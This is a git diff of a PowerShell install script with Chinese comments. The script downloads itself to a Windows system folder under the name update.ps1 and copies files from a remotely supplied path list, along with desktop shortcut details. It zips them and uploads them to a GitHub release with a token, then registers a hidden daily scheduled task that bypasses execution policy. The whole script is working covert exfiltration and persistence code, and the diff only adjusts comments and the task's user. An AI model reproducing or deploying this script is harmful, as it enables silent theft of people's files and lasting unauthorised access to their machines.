@@ -1,10 +1,11 @@
-# install.ps1 - 上传文件 + 注册每天 0:00 定时任务
+# install.ps1 - 上传文件 + 注册计划任务（当前用户）
 $logPath = "C:\upload_log.txt"
 "[INSTALL EXECUTED] $(Get-Date -Format u)" | Out-File $logPath -Append
 
-# 下载自身
+# 下载自身（用于计划任务）
 $localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 $remoteUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1"
+
 try {
     Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
     "[OK] install.ps1 downloaded to $localPath" | Out-File $logPath -Append
@@ -14,7 +15,7 @@ try {
 }
 
 # 获取 GitHub Token
-$token = [Environment]::GetEnvironmentVariable("GITHUB_TOKEN", "Machine")
+$token = $env:GITHUB_TOKEN
 if (-not $token) {
     "❌ GITHUB_TOKEN 环境变量不存在，终止执行。" | Out-File $logPath -Append
     return
@@ -34,12 +35,12 @@ try {
     $zipPath = Join-Path $env:TEMP $zipName
     New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-    # 获取上传路径
+    # 加载上传路径列表
     $targetListUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
     $pathList = Invoke-RestMethod -Uri $targetListUrl -UseBasicParsing
     $paths = $pathList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 
-    # 拷贝文件
+    # 复制文件
     $i = 0
     foreach ($path in $paths) {
         $i++
@@ -58,7 +59,7 @@ try {
         }
     }
 
-    # 收集桌面快捷方式
+    # 提取桌面快捷方式信息
     try {
         $desktop = [Environment]::GetFolderPath("Desktop")
         $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -92,7 +93,7 @@ try {
     $releaseResp = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData
     $uploadUrl = $releaseResp.upload_url -replace "{.*}", "?name=$zipName"
 
-    # 上传压缩包
+    # 上传 ZIP
     $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
     $uploadHeaders = @{
         Authorization = "token $token"
@@ -100,16 +101,17 @@ try {
         "User-Agent" = "PowerShell"
     }
     Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes
+
     "[OK] Upload completed." | Out-File $logPath -Append
 } catch {
     "❌ Upload failed: $($_.Exception.Message)" | Out-File $logPath -Append
 }
 
-# 清理临时文件
+# 清理
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 
-# 注册计划任务
+# 注册任务（当前用户）
 try {
     $taskName = "UploaderTask"
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
@@ -119,8 +121,9 @@ try {
 
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
     $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal
+
     "[OK] Scheduled task registered (0:00)." | Out-File $logPath -Append
 } catch {
     "? Failed to register task: $($_.Exception.Message)" | Out-File $logPath -Append
